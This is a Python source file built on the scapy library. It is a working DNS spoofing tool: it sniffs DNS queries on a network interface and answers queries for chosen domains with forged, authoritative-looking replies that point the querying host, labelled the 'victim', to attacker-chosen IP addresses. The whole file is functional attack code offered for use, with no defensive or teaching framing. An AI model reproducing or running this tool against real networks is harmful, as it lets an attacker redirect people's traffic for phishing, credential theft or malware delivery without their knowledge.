from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf

def spoof_dns_packet(pkt, domain_ip_map, iface):
    if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNS].qr == 0:
        try:
            queried_domain = pkt[DNSQR].qname.decode().strip(".").lower()

            if queried_domain not in domain_ip_map:
                print("[-] Ignored domain: {}".format(queried_domain))
                return

            fake_ip = domain_ip_map[queried_domain]
            victim_ip = pkt[IP].src
            victim_port = pkt[UDP].sport
            dns_id = pkt[DNS].id

            print("\n[>] Intercepted DNS query from {} for {}".format(victim_ip, queried_domain))

            ip_layer = IP(src=pkt[IP].dst, dst=victim_ip)
            udp_layer = UDP(sport=pkt[UDP].dport, dport=victim_port)

            dns_answer = DNSRR(
                rrname=pkt[DNSQR].qname,
                type="A",
                rclass="IN",
                ttl=300,
                rdata=fake_ip
            )

            dns_layer = DNS(
                id=dns_id,
                qr=1,
                aa=1,
                rd=pkt[DNS].rd,
                ra=1,
                qd=pkt[DNS].qd,
                an=dns_answer,
                ancount=1,
                nscount=0,
                arcount=0
            )

            spoofed_response = ip_layer / udp_layer / dns_layer

            del spoofed_response[IP].len
            del spoofed_response[IP].chksum
            del spoofed_response[UDP].len
            del spoofed_response[UDP].chksum

            send(spoofed_response, iface=iface, verbose=0)
            print("[+] Sent spoofed DNS response with {} to {}".format(fake_ip, victim_ip))

        except Exception as e:
            print("[!] Error processing DNS packet: {}".format(e))

def start_dns_spoofer(domain_ip_map, iface):
    print("[*] DNS spoofing started")
    print("[*] Listening on interface: {}".format(iface))
    print("[*] Spoofing targets:")
    for domain, ip in domain_ip_map.items():
        print("  - {} -> {}".format(domain, ip))

    conf.iface = iface

    try:
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=lambda pkt: spoof_dns_packet(pkt, domain_ip_map, iface),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped.")
    except Exception as e:
        print("[!] Error during sniffing: {}".format(e))
